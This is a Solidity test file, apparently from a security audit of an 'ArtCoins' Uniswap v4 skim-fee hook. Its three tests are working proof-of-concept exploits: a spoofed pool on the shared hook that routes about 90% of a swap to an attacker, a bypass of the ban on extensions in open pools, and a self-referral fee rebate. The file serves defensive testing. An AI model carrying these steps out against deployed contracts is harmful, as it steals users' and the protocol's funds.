// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IArtCoinsHookSkimFee} from "../../../../src/hooks/interfaces/IArtCoinsHookSkimFee.sol";
import {IArtCoinsPoolExtension} from "../../../../src/hooks/interfaces/IArtCoinsPoolExtension.sol";
import {HMArt, HMEthSink, HMReferralPayout, HooksMevBase} from "./HooksMevBase.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

contract HMRecordingExtension is IArtCoinsPoolExtension {
    uint256 public preCalls;
    uint256 public postCalls;
    address public lastLocker;

    function initializePreLockerSetup(PoolKey calldata, bool, bytes calldata) external {
        preCalls++;
    }

    function initializePostLockerSetup(PoolKey calldata, address l, bool) external {
        postCalls++;
        lastLocker = l;
    }

    function afterSwap(
        PoolKey calldata,
        IPoolManager.SwapParams calldata,
        BalanceDelta,
        bool,
        bytes calldata
    ) external {}

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

contract OpenPoolsReferralTest is HooksMevBase {
    using PoolIdLibrary for PoolKey;

    HMArt internal art;
    address internal attacker = address(0xA77AC);

    function setUp() public override {
        super.setUp();
        art = _newArt();
    }

    /// H11: anyone can open a second pool for a factory coin on the SAME
    /// shared hook (any other tickSpacing), with their own recipients and a
    /// 90% skim + 10% lp fee. it looks like an official artcoins pool; the
    /// only on-chain tell is locker[pid] == 0 / PoolCreatedOpen.
    function test_bug_H11_openPoolForFactoryCoinOnSharedHook() public {
        PoolKey memory canon = _skimPool(
            address(art),
            _skimFeeData(5000, 5000, 0, address(new HMEthSink()), address(new HMReferralPayout())),
            address(0x10C),
            address(0)
        );

        bytes memory fd = abi.encode(
            IArtCoinsHookSkimFee.SkimHookFeeData({
                baselineSkimBps: 90_000,
                bountyBps: 9999,
                maxReferralBpsOfVolume: 0,
                lpFee: 100_000,
                bountyRecipient: payable(attacker),
                protocolRecipient: payable(attacker),
                referralPayout: payable(attacker),
                quoteToken: address(0)
            })
        );
        vm.prank(attacker);
        PoolKey memory fake =
            skimHook.initializePoolOpen(address(art), address(0), 0, 10, _poolData(fd));

        assertEq(address(fake.hooks), address(skimHook), "same hook");
        assertEq(Currency.unwrap(fake.currency1), address(art), "same coin");
        (uint24 base,,,, address b,,,) = skimHook.skimConfig(fake.toId());
        assertEq(base, 90_000);
        assertEq(b, attacker);
        assertEq(skimHook.locker(fake.toId()), address(0), "only tell: no locker");
        assertTrue(skimHook.locker(canon.toId()) != address(0));

        // seeded with a bit of liquidity, a 1 eth buy routed into it pays the attacker ~0.9 eth
        _addLiquidity(fake, -6000, 6000, 1000 ether);
        uint256 a0 = attacker.balance;
        _swap(fake, true, -1 ether, 0, "", 1 ether);
        assertGt(attacker.balance - a0, 0.89 ether);
    }

    /// H12: initializePoolOpen forbids extensions, but setPoolExtension only
    /// checks token admin + allowlist, so the creator of any token with
    /// admin() == self attaches an allowlisted extension to an open pool (or
    /// to a pool id that was never initialized at all). the extension's init
    /// callbacks run with locker == 0 and an arbitrary pool key.
    function test_bug_H12_setPoolExtensionBypassesOpenPoolBan() public {
        HMRecordingExtension ext = new HMRecordingExtension();
        allowlist.setPoolExtension(address(ext), true);
        HMArt own = new HMArt(attacker);

        bytes memory fd = _skimFeeData(0, 0, 0, attacker, attacker);
        vm.startPrank(attacker);
        PoolKey memory k =
            skimHook.initializePoolOpen(address(own), address(0), 0, 60, _poolData(fd));
        skimHook.setPoolExtension(k, address(ext), "");
        vm.stopPrank();
        assertEq(skimHook.poolExtension(k.toId()), address(ext));
        assertTrue(skimHook.poolExtensionSetup(k.toId()));
        assertEq(ext.postCalls(), 1);
        assertEq(ext.lastLocker(), address(0));

        // never-initialized pool id: artCoinIsToken0 defaults false -> art = currency1
        PoolKey memory ghost = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(own)),
            fee: 0x800000,
            tickSpacing: 777,
            hooks: IHooks(address(skimHook))
        });
        vm.prank(attacker);
        skimHook.setPoolExtension(ghost, address(ext), "");
        assertEq(ext.postCalls(), 2, "extension initialized for a pool that does not exist");
    }

    /// H13: the swapper picks the referrer in hookData. naming itself gives a
    /// rebate of min(cap, protocolShare) out of the protocol leg on every
    /// swap. live coin 111 cap is 250 (0.25% of volume, ~25% of protocol leg).
    function test_bug_H13_selfReferralRebate() public {
        HMReferralPayout payout = new HMReferralPayout();
        HMEthSink bounty = new HMEthSink();
        PoolKey memory key = _skimPool(
            address(art),
            _skimFeeData(5000, 5000, 1000, address(bounty), address(payout)),
            address(0x10C),
            address(0)
        );
        _addLiquidity(key, -6000, 6000, 1000 ether);

        _swap(key, true, -1 ether, 0, _attributionData(address(this), 1000), 1 ether);
        assertEq(payout.credited(address(this)), 0.01 ether, "swapper rebated 1% of volume");
        assertEq(
            escrow.feesToClaim(protocolR, address(0)), 0.015 ether, "protocol leg 0.025 -> 0.015"
        );
        assertEq(address(bounty).balance, 0.025 ether, "bounty untouched");
    }
}
